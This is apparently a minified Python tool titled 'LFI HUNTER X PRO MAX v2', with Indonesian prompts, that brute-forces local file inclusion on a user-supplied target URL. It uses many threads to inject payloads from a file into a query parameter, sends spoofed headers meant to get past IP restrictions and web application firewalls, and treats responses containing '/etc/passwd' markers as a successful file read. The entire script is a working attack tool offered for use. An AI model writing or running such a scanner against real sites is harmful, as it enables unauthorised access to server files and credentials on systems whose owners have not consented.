N=False
J='green'
I=input
F='blue'
C='cyan'
B='red'
import requests as K,time,sys as D,os
from urllib.parse import quote,urlparse as O,parse_qs as P
from termcolor import cprint as A,colored as G
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor as Q
def R(file='user.txt'):
	C=file
	if not os.path.exists(C):A(f"[!] File {C} tidak ditemukan!",B);D.exit()
	with open(C,'r')as E:return[A.strip()for A in E if A.strip()]
def S(file='payload.txt'):
	C=file
	if not os.path.exists(C):A(f"[!] File {C} tidak ditemukan!",B);D.exit()
	with open(C,'r')as E:return[A.strip()for A in E if A.strip()]
def T(user_agent):A='127.0.0.1';return{'User-Agent':user_agent,'X-Forwarded-For':A,'Referer':'https://google.com/','X-Original-URL':'/admin','X-Custom-IP-Authorization':A,'Accept':'*/*','Connection':'close'}
def U(text):A=['root:x:0:','PATH=','[fonts]','GNU','Linux','bin/bash'];return any(A.lower()in text.lower()for A in A)
def V(url):A=O(url);B=P(A.query);return list(B.keys())
def W(url,param,user_agent,payload):
	F=param;G=quote(payload);D=url.replace(f"{F}=",f"{F}={G}");E=T(user_agent)
	try:
		C=K.get(D,headers=E,timeout=10)
		if C.status_code==403:E['X-Bypass-WAF']='true';C=K.get(D,headers=E,timeout=10)
		if C.status_code==200 and U(C.text):A(f"\n[✓] SUCCESS: {D}",J);A(C.text[:300],'white');return True
	except Exception as H:A(f"[x] Error: {H}",B)
	return N
def X(url,param,user_agents,payloads,thread_count):
	F=thread_count;B=[]
	for D in user_agents:
		for E in payloads:B.append((D,E))
	A(f"\n[•] Total kombinasi: {len(B)} | Threads: {F}",C);time.sleep(1);G=N
	with Q(max_workers=F)as I:
		H=[]
		for(D,E)in B:H.append(I.submit(W,url,param,D,E))
		for K in tqdm(H,desc='Scanning',colour=J):
			if K.result():G=True;break
	if not G:A('\n[-] Scan selesai. Tidak ada payload yang berhasil.','yellow')
if __name__=='__main__':
	os.system('clear');A('╔══════════════════════════════════════════════╗',F);A('║           LFI HUNTER X PRO MAX v2           ║',F);A('║      Super Brutal Multi-threaded Scanner    ║',F);A('╚══════════════════════════════════════════════╝\n',F);H=I(G('[?] Masukkan URL target: ',C))
	if'='not in H:A('[!] URL tidak valid. Gunakan format: ?page=xxx',B);D.exit()
	E=I(G('[?] Masukkan nama parameter (kosongkan untuk auto): ',C)).strip()
	if not E:
		A('[•] Auto mendeteksi parameter dari URL...',C);L=V(H)
		if not L:A('[!] Gagal deteksi parameter.',B);D.exit()
		E=L[0];A(f"[✓] Menggunakan parameter: {E}",J)
	try:M=int(I(G('[?] Jumlah thread (default 10): ',C))or 10)
	except:M=10
	Y=R();Z=S();X(H,E,Y,Z,M)
